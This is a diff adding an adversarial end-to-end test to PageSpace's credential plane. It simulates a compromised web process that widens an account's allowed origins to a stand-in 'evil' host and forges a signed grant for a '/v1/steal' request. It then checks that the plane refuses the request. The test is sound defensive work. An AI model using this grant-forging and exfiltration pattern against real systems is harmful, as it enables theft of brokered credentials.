@@ -55,6 +55,9 @@ import { createAccountAuthority, type AccountAuthority } from '../../account-aut
 import { createPlaneClient, type PlaneClient } from '../../plane-client';
 import { authorize } from '../../authorize';
 import { signGrant } from '../../sign-grant';
+import { planeBindingsFor } from '../../plane-bindings-for';
+import { digestBindings } from '../../store/digest-bindings';
+import { agentAccounts } from '@pagespace/db/schema/agent-accounts';
 import { createPinnedHttpsClient } from '../../executor/pinned-https-client';
 import { createHttpRequestExecutor } from '../../executor/http-request-executor';
 import { createPlaneRequestHandler } from '../../executor/plane-http-adapter';
@@ -64,6 +67,8 @@ const ADMIN_TOKEN = process.env.INFISICAL_DEV_ADMIN_TOKEN;
 const METADATA_URL = process.env.PLANE_METADATA_DEV_URL ?? 'postgres://plane_metadata:plane_metadata@127.0.0.1:55433/plane_metadata';
 const CANARY = `sk_canary_${randomBytes(12).toString('hex')}`;
 const HOST = 'api.e2e-weather.example';
+/** A second name on the same test certificate, so a request there would succeed if nothing refused it. */
+const EVIL_HOST = 'collector.e2e-evil.example';
 const RUN = `g2e2e${Date.now()}`;
 // Real PageSpace ids are cuid2; the centralized permission functions refuse anything else.
 const OWNER = createId() as UserId;
@@ -97,7 +102,7 @@ function openssl(args: readonly string[]) {
 }
 
 function startUpstream(): Promise<void> {
-  writeFileSync(path.join(certDir, 'leaf.ext'), `subjectAltName=DNS:${HOST}\n`);
+  writeFileSync(path.join(certDir, 'leaf.ext'), `subjectAltName=DNS:${HOST},DNS:${EVIL_HOST}\n`);
   openssl(['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'ca.key', '-subj', '/CN=g2-e2e-ca', '-days', '1', '-out', 'ca.pem']);
   openssl(['req', '-newkey', 'rsa:2048', '-nodes', '-keyout', 'leaf.key', '-subj', `/CN=${HOST}`, '-out', 'leaf.csr']);
   openssl(['x509', '-req', '-in', 'leaf.csr', '-CA', 'ca.pem', '-CAkey', 'ca.key', '-CAcreateserial', '-days', '1', '-extfile', 'leaf.ext', '-out', 'leaf.pem']);
@@ -327,6 +332,52 @@ describe.skipIf(!ADMIN_TOKEN)('adversarial: the G2 thin slice end to end (real p
       legit: true,
       replayedTwice: { ok: false, reason: 'refused' },
     };
+    expect(actual).toEqual(expected);
+  }, 60_000);
+
+  // Review HIGH-1: the plane must hold the pin itself. A compromised web process (signing key + main-DB
+  // write) widens the row's origins and signs a grant over the ORIGINAL bindings digest; the plane's
+  // stored bindings never widened, so the request must be refused before anything is sent.
+  it('given a main-DB row widened to another origin and a grant signed over the original bindings, should refuse — the plane checks its own stored origins', async () => {
+    const plane = await startPlane();
+    const authority = authorityOver(plane);
+    const created = await authority.createAccount({ actorUserId: OWNER, owner: { kind: 'agent_page', agentPageId: PAGE_A }, input: createInput(true) });
+    if (!created.ok) throw new Error(created.reason);
+    const repo = createAgentAccountRepository({ db });
+    const original = await repo.find(created.account.id);
+    if (original === null) throw new Error('row missing');
+    const evilOrigin = `https://${EVIL_HOST}:${upstreamPort}`;
+    await db.update(agentAccounts).set({ allowedOrigins: [origin, evilOrigin] }).where(eq(agentAccounts.id, original.id));
+    const tampered = await repo.find(original.id);
+    const policy = { ...(original.approvalPolicy as Record<string, unknown>) };
+    const verdict = authorize({
+      caller: caller(),
+      account: { ...tampered!, approvalPolicy: { ...policy, scope: { ...(policy.scope as Record<string, unknown>), origins: [origin, evilOrigin] } } },
+      facts: { humanDriveRole: 'OWNER', agentPagePermission: 'edit', agentBoundToAccount: false, boundAgentPageIds: [], delegation: { kind: 'live_session' }, ceilingAdmitsAccount: true },
+      request: get(`${evilOrigin}/v1/steal`),
+      registry: [],
+      approvals: [],
+      usage: { usesThisHour: 0, bytesOutThisHour: 0, concurrent: 0 },
+      presenter: { keyId: PRESENTER, channel: 'http-executor' },
+      now: Date.now(),
+      grantId: `g_${randomBytes(6).toString('hex')}` as never,
+      nonce: `n_${randomBytes(6).toString('hex')}` as never,
+      ttlMs: 60_000,
+      hash: sha3,
+    });
+    if (!verdict.ok) throw new Error(`authorize refused the forged request: ${verdict.reason}`);
+    const forged = { ...verdict.grant, bindingDigest: digestBindings({ bindings: planeBindingsFor({ row: original, boundAgentPageIds: [], hash: sha3 }).bindings, hash: sha3 }) };
+    const before = upstreamHits.length;
+    const result = seen(
+      await plane.execute({
+        grant: forged,
+        signature: signGrant({ grant: forged, key: keyring.current }),
+        request: { method: 'GET', url: `${evilOrigin}/v1/steal`, headers: { accept: 'application/json' }, bodyBase64: '' },
+        run: { human: forged.human, agentPageId: PAGE_A, conversationId: forged.conversationId, runId: forged.runId },
+      }),
+    );
+    const actual = { result, stolen: upstreamHits.slice(before).filter((hit) => hit.startsWith('/v1/steal')).length };
+    const expected = { result: { ok: false, reason: 'refused' }, stolen: 0 };
     expect(actual).toEqual(expected);
   }, 60_000);
 
